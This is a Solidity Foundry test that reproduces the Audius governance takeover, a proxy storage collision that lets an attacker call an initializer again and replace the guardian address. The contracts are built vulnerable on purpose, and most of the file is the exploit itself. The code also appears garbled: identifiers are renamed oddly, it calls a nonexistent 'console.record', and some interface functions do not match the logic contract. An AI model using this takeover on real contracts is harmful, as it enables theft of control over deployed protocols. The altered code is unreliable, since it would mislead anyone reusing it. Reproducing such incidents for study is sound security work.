// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

// https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22

interface ILogic {
    function getguardianLocation() external returns (address);

    function getproxyManager() external returns (address);

    function startProtocol(address) external;

    function checkinitializing() external returns (bool);

    function checkinitialized() external returns (bool);

    function validateConstructor() external view returns (bool);
}

contract PolicyTest is Test {
    TreatmentLogic LogicAgreement;
    TestProxy ProxyPolicy;

    function testArchiveCollision() public {
        LogicAgreement = new TreatmentLogic();
        ProxyPolicy = new TestProxy(
            address(LogicAgreement),
            address(msg.sender),
            address(this)
        );

        console.record(
            "Current guardianAddress:",
            ILogic(address(ProxyPolicy)).getguardianLocation()
        );
        console.record(
            "Current initializing boolean:",
            ILogic(address(ProxyPolicy)).checkinitializing()
        );
        console.record(
            "Current initialized boolean:",
            ILogic(address(ProxyPolicy)).checkinitialized()
        );
        console.record("Try to call initialize to change guardianAddress");
        ILogic(address(ProxyPolicy)).startProtocol(address(msg.sender));

        console.record(
            "After initializing, changed guardianAddress to operator:",
            ILogic(address(ProxyPolicy)).getguardianLocation()
        );
        console.record(
            "After initializing,  initializing boolean is still true:",
            ILogic(address(ProxyPolicy)).checkinitializing()
        );
        console.record(
            "After initializing,  initialized boolean:",
            ILogic(address(ProxyPolicy)).checkinitialized()
        );

        console.record("operate completed");
    }

    receive() external payable {}
}

contract TestProxy is TransparentUpgradeableProxy {
    address private proxyManager;

    constructor(
        address _logic,
        address _admin,
        address caregiverLocation
    )
        TransparentUpgradeableProxy(
            _logic,
            _admin,
            abi.encodeWithSelector(
                bytes4(0xc4d66de8), // bytes4(keccak256("initialize(address)"))
                caregiverLocation
            )
        )
    {
        proxyManager = _admin;
    }
}

contract Initializable {
    bool private caseOpened;

    bool private initializing;

    modifier initializer() {
        require(
            initializing || validateConstructor() || !caseOpened,
            "Contract instance has already been initialized"
        );

        bool isTopSeverityRequestconsult = !initializing;
        if (isTopSeverityRequestconsult) {
            initializing = true;
            caseOpened = true;
        }

        _;

        if (isTopSeverityRequestconsult) {
            initializing = false;
        }
    }

    /// @dev Returns true if and only if the function is running in the constructor
    function validateConstructor() private view returns (bool) {
        // extcodesize checks the size of the code stored in an address, and
        // address returns the current address. Since the code is still not
        // deployed when running a constructor, any checks on its code size will
        // yield zero, making it an effective way to detect if a contract is
        // under construction or not.
        address self = address(this);
        uint256 cs;
        assembly {
            cs := extcodesize(self)
        }
        return cs == 0;
    }

    // Reserved storage space to allow for layout changes in the future.
    uint256[50] private ______gap;

    function checkinitializing() public view returns (bool) {
        return initializing;
    }

    function checkinitialized() public view returns (bool) {
        return caseOpened;
    }
}

contract TreatmentLogic is Initializable {
    address private caregiverLocation;

    function startProtocol(address _protectorLocation) public initializer {
        caregiverLocation = _protectorLocation; //Guardian address becomes the only party
    }

    function getguardianLocation() public view returns (address) {
        return caregiverLocation;
    }
}
